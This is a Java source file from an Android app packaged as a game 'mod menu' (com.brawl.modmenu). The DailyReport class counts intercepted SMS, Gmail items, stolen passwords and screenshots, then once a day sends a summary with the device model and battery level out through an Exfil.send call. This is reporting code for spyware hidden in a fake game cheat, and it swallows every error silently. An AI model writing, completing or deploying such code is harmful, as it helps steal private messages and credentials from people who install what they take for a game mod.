package com.brawl.modmenu;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.BatteryManager;
import android.content.Intent;
import android.content.IntentFilter;

public class DailyReport {

    private static final String PREF = "stats";
    private static final long DAY = 24 * 60 * 60 * 1000L;

    public static void bump(Context ctx, String key) {
        try {
            SharedPreferences p = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE);
            int v = p.getInt(key, 0);
            p.edit().putInt(key, v + 1).apply();
        } catch (Throwable ignored) {}
    }

    public static void sendIfDue(final Context ctx) {
        new Thread(() -> {
            try {
                SharedPreferences p = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE);
                long last = p.getLong("last_report", 0);
                if (System.currentTimeMillis() - last < DAY) return;

                StringBuilder sb = new StringBuilder();
                sb.append("📱 ").append(DeviceInfo.getModel(ctx)).append("\n");
                sb.append("─────────────\n");
                sb.append("SMS: ").append(p.getInt("sms", 0)).append("\n");
                sb.append("Gmail: ").append(p.getInt("gmail", 0)).append("\n");
                sb.append("Пароли: ").append(p.getInt("steal", 0)).append("\n");
                sb.append("Скрины: ").append(p.getInt("screen", 0)).append("\n");
                sb.append("SMS за сутки: ").append(p.getInt("sms_day", 0)).append("\n");

                IntentFilter ifil = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                Intent bat = ctx.registerReceiver(null, ifil);
                if (bat != null) {
                    int level = bat.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                    sb.append("Батарея: ").append(level).append("%\n");
                }

                Exfil.send("DAILY", sb.toString());

                p.edit().putLong("last_report", System.currentTimeMillis()).apply();
            } catch (Throwable ignored) {}
        }).start();
    }
}
